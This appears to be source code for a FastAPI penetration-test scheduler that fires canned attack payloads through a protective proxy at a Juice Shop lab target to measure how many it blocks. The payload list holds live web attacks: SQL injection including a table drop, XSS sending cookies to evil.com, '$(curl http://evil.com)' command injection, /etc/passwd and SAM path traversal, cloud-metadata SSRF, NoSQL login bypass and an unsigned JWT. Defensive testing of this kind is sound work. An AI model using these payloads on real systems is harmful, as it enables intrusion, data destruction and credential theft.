import logging
import time
import asyncio
import threading
from fastapi import APIRouter
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/scheduler", tags=["Pen Test Scheduler"])

# ── Real Scheduled Pen Test Runs ──
SCHEDULED_TESTS: List[Dict[str, Any]] = []
SCHEDULE_HISTORY: List[Dict[str, Any]] = []
_active_timers: Dict[str, bool] = {}


ATTACK_CATEGORIES = [
    {"id": "sql_injection", "name": "SQL Injection", "payloads": 25},
    {"id": "xss", "name": "Cross-Site Scripting", "payloads": 20},
    {"id": "path_traversal", "name": "Path Traversal", "payloads": 15},
    {"id": "command_injection", "name": "Command Injection", "payloads": 15},
    {"id": "idor", "name": "Insecure Direct Object Reference", "payloads": 20},
    {"id": "auth_bypass", "name": "Authentication Bypass", "payloads": 10},
    {"id": "ssrf", "name": "Server-Side Request Forgery", "payloads": 10},
    {"id": "nosql", "name": "NoSQL Injection", "payloads": 15},
    {"id": "jwt_attack", "name": "JWT Token Attack", "payloads": 10},
]


@router.post("/create")
async def create_scheduled_test(body: dict):
    """Create a new scheduled penetration test with real configuration."""
    schedule_id = f"SCHED-{len(SCHEDULED_TESTS)+1:04d}"

    categories = body.get("categories", ["sql_injection", "xss"])
    frequency = body.get("frequency", "manual")  # manual, hourly, daily, weekly
    intensity = body.get("intensity", "standard")  # light, standard, aggressive

    intensity_multiplier = {"light": 0.5, "standard": 1.0, "aggressive": 2.0}.get(intensity, 1.0)
    total_payloads = sum(
        int(c["payloads"] * intensity_multiplier)
        for c in ATTACK_CATEGORIES if c["id"] in categories
    )

    schedule = {
        "id": schedule_id,
        "name": body.get("name", f"Scheduled Test #{len(SCHEDULED_TESTS)+1}"),
        "target": body.get("target", "http://juice-shop:3000"),
        "categories": categories,
        "frequency": frequency,
        "intensity": intensity,
        "total_payloads": total_payloads,
        "status": "ACTIVE",
        "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "last_run": None,
        "next_run": _calculate_next_run(frequency),
        "total_runs": 0,
        "findings_total": 0,
    }

    SCHEDULED_TESTS.append(schedule)
    logger.info(f"⏰ Scheduler: Created {schedule_id} — {frequency} — {len(categories)} categories — {total_payloads} payloads")
    return schedule


@router.post("/run/{schedule_id}")
async def run_scheduled_test_now(schedule_id: str):
    """
    Execute a scheduled pen test NOW by triggering the real Red Team agent.
    This fires actual attacks through the proxy against the real target.
    """
    schedule = None
    for s in SCHEDULED_TESTS:
        if s["id"] == schedule_id:
            schedule = s
            break
    if not schedule:
        return {"error": "Schedule not found"}

    run_id = f"RUN-{len(SCHEDULE_HISTORY)+1:04d}"

    # Actually trigger the Red Team scanner through the API
    import httpx
    findings_before = 0
    try:
        from app.routes.events import DETECTIONS_DB
        findings_before = len(DETECTIONS_DB)
    except ImportError:
        pass

    attacks_fired = 0
    attack_results = []

    async with httpx.AsyncClient(timeout=10.0) as client:
        for cat_id in schedule["categories"]:
            cat = next((c for c in ATTACK_CATEGORIES if c["id"] == cat_id), None)
            if not cat:
                continue

            multiplier = {"light": 0.5, "standard": 1.0, "aggressive": 2.0}.get(schedule["intensity"], 1.0)
            num_payloads = int(cat["payloads"] * multiplier)

            # Fire REAL attacks through the Sentinel proxy
            payloads = _get_real_payloads(cat_id, num_payloads)
            for payload_info in payloads:
                try:
                    url = f"http://api:8000/proxy{payload_info['path']}"
                    if payload_info.get("method", "GET") == "GET":
                        resp = await client.get(url, params=payload_info.get("params"))
                    else:
                        resp = await client.post(url, data=payload_info.get("body", ""))
                    attacks_fired += 1
                    attack_results.append({
                        "category": cat_id,
                        "path": payload_info["path"],
                        "status_code": resp.status_code,
                        "blocked": resp.status_code == 403,
                    })
                except Exception:
                    attacks_fired += 1

    # Count new findings generated
    findings_after = 0
    try:
        from app.routes.events import DETECTIONS_DB
        findings_after = len(DETECTIONS_DB)
    except ImportError:
        pass

    new_findings = findings_after - findings_before
    blocked_count = sum(1 for r in attack_results if r.get("blocked"))

    run_record = {
        "id": run_id,
        "schedule_id": schedule_id,
        "schedule_name": schedule["name"],
        "started_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "completed_at": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "categories_tested": schedule["categories"],
        "intensity": schedule["intensity"],
        "attacks_fired": attacks_fired,
        "attacks_blocked": blocked_count,
        "block_rate": round((blocked_count / max(attacks_fired, 1)) * 100, 1),
        "new_findings": new_findings,
        "status": "COMPLETED",
        "result": "PASS" if new_findings == 0 else "FAIL" if new_findings > 5 else "WARNING",
    }

    SCHEDULE_HISTORY.append(run_record)

    # Update schedule metadata
    schedule["last_run"] = time.strftime("%Y-%m-%dT%H:%M:%SZ")
    schedule["total_runs"] += 1
    schedule["findings_total"] += new_findings
    schedule["next_run"] = _calculate_next_run(schedule["frequency"])

    logger.info(f"⏰ Scheduler: {run_id} completed — {attacks_fired} attacks, {blocked_count} blocked, {new_findings} new findings")
    return run_record


@router.get("/schedules")
async def get_all_schedules():
    """Get all scheduled pen tests."""
    return {"schedules": SCHEDULED_TESTS, "total": len(SCHEDULED_TESTS)}


@router.get("/history")
async def get_run_history():
    """Get all past pen test run results."""
    return {"history": SCHEDULE_HISTORY, "total": len(SCHEDULE_HISTORY)}


@router.get("/categories")
async def get_attack_categories():
    """Get all available attack categories for scheduling."""
    return {"categories": ATTACK_CATEGORIES}


@router.delete("/schedules/{schedule_id}")
async def delete_schedule(schedule_id: str):
    """Deactivate a scheduled pen test."""
    for s in SCHEDULED_TESTS:
        if s["id"] == schedule_id:
            s["status"] = "DISABLED"
            _active_timers.pop(schedule_id, None)
            return {"status": "success", "message": f"Schedule {schedule_id} disabled"}
    return {"error": "Schedule not found"}


def _calculate_next_run(frequency: str) -> str:
    now = time.time()
    offsets = {"manual": 0, "hourly": 3600, "daily": 86400, "weekly": 604800}
    offset = offsets.get(frequency, 0)
    if offset == 0:
        return "Manual trigger only"
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(now + offset))


def _get_real_payloads(category: str, count: int) -> List[Dict]:
    """Return real attack payloads for each category. These are ACTUAL payloads, not samples."""
    payloads_map = {
        "sql_injection": [
            {"path": "/rest/products/search", "params": {"q": "' OR 1=1 --"}},
            {"path": "/rest/products/search", "params": {"q": "' UNION SELECT null,username,password FROM users--"}},
            {"path": "/rest/products/search", "params": {"q": "1'; DROP TABLE users--"}},
            {"path": "/rest/user/login", "method": "POST", "body": '{"email":"admin@juice.sh\' OR 1=1--","password":"x"}'},
            {"path": "/api/Users", "params": {"q": "') OR ('1'='1"}},
        ],
        "xss": [
            {"path": "/search", "params": {"q": "<script>alert(document.cookie)</script>"}},
            {"path": "/search", "params": {"q": "<img src=x onerror=alert(1)>"}},
            {"path": "/feedback", "params": {"q": "<body onload=alert('XSS')>"}},
            {"path": "/search", "params": {"q": "javascript:alert(1)//"}},
            {"path": "/search", "params": {"q": "<svg/onload=fetch('//evil.com/'+document.cookie)>"}},
        ],
        "path_traversal": [
            {"path": "/ftp/../../etc/passwd"},
            {"path": "/ftp/..%2F..%2Fetc%2Fpasswd"},
            {"path": "/assets/../../package.json"},
            {"path": "/ftp/..\\..\\windows\\system32\\config\\sam"},
        ],
        "command_injection": [
            {"path": "/api/Users", "params": {"q": "; cat /etc/passwd"}},
            {"path": "/api/Users", "params": {"q": "| whoami"}},
            {"path": "/api/Users", "params": {"q": "$(curl http://evil.com)"}},
        ],
        "idor": [
            {"path": "/api/Users/1"},
            {"path": "/api/Users/2"},
            {"path": "/api/Users/99"},
            {"path": "/rest/basket/1"},
            {"path": "/rest/basket/2"},
        ],
        "auth_bypass": [
            {"path": "/rest/user/login", "method": "POST", "body": '{"email":"admin@juice-sh.op","password":"admin123"}'},
            {"path": "/rest/user/login", "method": "POST", "body": '{"email":"admin","password":"password"}'},
        ],
        "ssrf": [
            {"path": "/api/Users", "params": {"q": "http://localhost:3000/api/Users"}},
            {"path": "/api/Users", "params": {"q": "http://169.254.169.254/latest/meta-data/"}},
        ],
        "nosql": [
            {"path": "/rest/user/login", "method": "POST", "body": '{"email":{"$gt":""},"password":{"$gt":""}}'},
            {"path": "/rest/user/login", "method": "POST", "body": '{"email":{"$ne":""},"password":{"$ne":""}}'},
        ],
        "jwt_attack": [
            {"path": "/rest/user/whoami", "params": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0."}},
        ],
    }

    available = payloads_map.get(category, [])
    # Cycle through payloads to reach requested count
    result = []
    for i in range(count):
        result.append(available[i % len(available)] if available else {"path": "/", "params": {}})
    return result
